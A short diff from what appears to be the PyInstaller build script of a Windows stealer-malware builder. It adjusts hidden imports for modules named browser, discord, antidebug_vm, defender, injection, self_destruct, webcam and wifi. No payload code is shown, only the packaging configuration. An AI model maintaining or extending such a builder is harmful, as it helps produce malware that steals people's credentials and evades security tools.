@@ -608,22 +608,22 @@ if __name__ == '__main__' and os.name == "nt":
 			
 			included_modules_pyinstaller = [
 				"json",
-				"requests_toolbelt"
+				"requests_toolbelt",
+				"sys"
 				]
 			
 			option_module_mapping_pyinstaller = {
-				"anti_spam": ["time", "sys"],
+				"anti_spam": ["time"],
 				"backupcodes": ["re"],
 				"browser": ["sqlite3", "win32crypt", "Cryptodome.Cipher.AES", "base64", "psutil", "typing"],
 				"clipboard": ["pyperclip"],
-				"antidebug_vm": ["psutil", "subprocess", "sys"],
+				"antidebug_vm": ["psutil", "subprocess"],
 				"defender": ["subprocess", "base64"],
 				"discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt", "base64", "re"],
 				"fakeerror": ["ctypes"],
 				"injection": ["subprocess", "psutil", "re"],
 				"systeminfo": ["psutil", "subprocess"],
-				"self_destruct": ["subprocess", "sys"],
-				"startup": ["sys"],
+				"self_destruct": ["subprocess"],
 				"wifi": ["subprocess"],
 				"webcam": ["cv2"]
 			}
